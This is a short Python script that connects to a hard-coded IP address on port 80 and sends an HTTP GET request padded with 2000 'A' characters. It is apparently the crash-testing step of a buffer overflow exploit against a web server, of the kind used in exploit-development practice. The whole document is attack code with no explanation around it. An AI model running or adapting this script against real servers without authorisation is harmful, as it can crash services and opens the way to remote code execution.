
#!/usr/share/python
import socket,sys
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('11.11.11.7',80))
buff="GET "
buff+="A"*2000
buff+=" HTTP/1.1\r\n\r\n"
s.send(buff)
s.close()
